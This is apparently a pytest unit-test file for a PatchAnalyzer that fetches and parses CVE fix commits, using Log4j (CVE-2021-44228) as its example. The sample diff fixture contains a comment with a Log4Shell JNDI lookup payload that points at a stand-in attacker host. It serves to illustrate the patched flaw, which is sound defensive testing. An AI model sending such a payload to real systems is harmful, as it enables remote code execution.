"""Unit tests for the patch analyzer (PatchAnalyzer) — FR-2."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from core.agents.vulnerability.models import PatchInfo
from core.agents.vulnerability.patch_analyzer import PatchAnalyzer


@pytest.fixture
def analyzer() -> PatchAnalyzer:
    return PatchAnalyzer()


SAMPLE_DIFF = """\
--- a/src/main/java/com/example/App.java
+++ b/src/main/java/com/example/App.java
@@ -10,7 +10,7 @@
 public class App {
-    public void processInput(String input) {
-        lookup.lookup(input);  // vulnerable: ${jndi:ldap://attacker.com/x}
+    public void processInput(String input) {
+        // FIXED: input sanitized before lookup
+        safeProcessInput(sanitize(input));
     }
 }
"""


class TestFindGithubCommit:
    def test_finds_github_commit(self, analyzer):
        refs = [
            "https://nvd.nist.gov/...",
            "https://github.com/apache/log4j/commit/abc123def456",
        ]
        result = analyzer._find_github_commit(refs)
        assert result == "https://github.com/apache/log4j/commit/abc123def456"

    def test_returns_none_when_no_commit(self, analyzer):
        refs = ["https://nvd.nist.gov/...", "https://vendor.com/advisory"]
        result = analyzer._find_github_commit(refs)
        assert result is None

    def test_returns_none_for_empty_refs(self, analyzer):
        assert analyzer._find_github_commit([]) is None


class TestExtractReferencesFromNVD:
    def test_extracts_urls(self):
        nvd_data = {
            "cve": {
                "references": [
                    {"url": "https://github.com/apache/log4j/commit/abc123"},
                    {"url": "https://vendor.com/advisory"},
                    {},  # No url key
                ]
            }
        }
        refs = PatchAnalyzer.extract_references_from_nvd(nvd_data)
        assert "https://github.com/apache/log4j/commit/abc123" in refs
        assert "https://vendor.com/advisory" in refs
        assert "" not in refs

    def test_handles_missing_references(self):
        nvd_data = {"cve": {}}
        refs = PatchAnalyzer.extract_references_from_nvd(nvd_data)
        assert refs == []


class TestFetchPatch:
    def test_returns_unavailable_when_no_github_url(self, analyzer):
        refs = ["https://vendor.com/advisory"]
        result = analyzer.fetch_patch(cve_id="CVE-2021-44228", references=refs)
        assert result.available is False
        assert "GitHub" in result.fetch_error or "GitLab" in result.fetch_error

    def test_successful_fetch(self, analyzer):
        refs = ["https://github.com/apache/log4j2/commit/abc123def456789abc"]
        with patch("httpx.Client") as mock_client:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.text = SAMPLE_DIFF
            mock_client.return_value.__enter__.return_value.get.return_value = mock_resp

            result = analyzer.fetch_patch("CVE-2021-44228", refs)
            assert result.available is True
            assert result.diff_text == SAMPLE_DIFF
            assert result.source == "github"

    def test_returns_unavailable_on_404(self, analyzer):
        refs = ["https://github.com/apache/log4j2/commit/abc123def456789abc"]
        with patch("httpx.Client") as mock_client:
            mock_resp = MagicMock()
            mock_resp.status_code = 404
            mock_client.return_value.__enter__.return_value.get.return_value = mock_resp

            result = analyzer.fetch_patch("CVE-2021-44228", refs)
            assert result.available is False
            assert "404" in result.fetch_error

    def test_returns_unavailable_on_timeout(self, analyzer):
        import httpx

        refs = ["https://github.com/apache/log4j2/commit/abc123def456789abc"]
        with patch("httpx.Client") as mock_client:
            mock_client.return_value.__enter__.return_value.get.side_effect = (
                httpx.TimeoutException("timeout")
            )

            result = analyzer.fetch_patch("CVE-2021-44228", refs)
            assert result.available is False
            assert (
                "Timeout" in result.fetch_error
                or "timeout" in result.fetch_error.lower()
            )


class TestAnalyzePatch:
    def test_unavailable_when_no_diff(self, analyzer):
        patch_info = PatchInfo(
            cve_id="CVE-2021-44228", available=False, fetch_error="No URL found"
        )
        result = analyzer.analyze_patch(patch_info)
        assert result.available is False

    def test_extracts_vulnerable_function(self, analyzer):
        patch_info = PatchInfo(
            cve_id="CVE-2021-44228",
            available=True,
            diff_text=SAMPLE_DIFF,
            source="github",
        )
        result = analyzer.analyze_patch(patch_info)
        assert result.available is True
        assert (
            result.vulnerable_function == "processInput"
            or result.diff_summary is not None
        )

    def test_diff_summary_present(self, analyzer):
        patch_info = PatchInfo(
            cve_id="CVE-2021-44228",
            available=True,
            diff_text=SAMPLE_DIFF,
            source="github",
        )
        result = analyzer.analyze_patch(patch_info)
        assert result.diff_summary is not None
        assert len(result.diff_summary) > 0


class TestSimpleDiff:
    def test_produces_valid_diff(self):
        old = "def foo():\n    return 1\n"
        new = "def foo():\n    return 2\n"
        diff = PatchAnalyzer._compute_simple_diff(old, new)
        assert "---" in diff
        assert "+++" in diff
        assert "-    return 1" in diff
        assert "+    return 2" in diff

    def test_identical_files_produce_empty_diff(self):
        code = "def foo():\n    pass\n"
        diff = PatchAnalyzer._compute_simple_diff(code, code)
        assert diff == ""

    def test_gitlab_commit_url_recognition(self, analyzer):
        refs = ["https://gitlab.com/group/project/-/commit/123456789abcdef"]
        commit_url = analyzer._find_github_commit(refs)
        assert commit_url is not None
        assert "gitlab.com" in commit_url

    def test_multi_file_diff_parsing(self, analyzer):
        multi_diff = """\
--- a/src/Auth.py
+++ b/src/Auth.py
@@ -5,3 +5,3 @@
-def login(user, pwd):
+def login(user, pwd, token):
     pass
--- a/src/Util.py
+++ b/src/Util.py
@@ -10,3 +10,3 @@
-def check(x):
+def check(x, y):
     pass
"""
        patch_info = PatchInfo(
            cve_id="CVE-2023-1234",
            available=True,
            diff_text=multi_diff,
            source="github",
        )
        result = analyzer.analyze_patch(patch_info)
        assert result.available is True
        assert result.changed_files_count >= 2

    def test_malformed_diff_handled_gracefully(self, analyzer):
        malformed = "NOT A VALID DIFF CONTENT AT ALL"
        patch_info = PatchInfo(
            cve_id="CVE-2023-1234",
            available=True,
            diff_text=malformed,
            source="github",
        )
        result = analyzer.analyze_patch(patch_info)
        assert result.available is True
        assert result.changed_files_count == 0
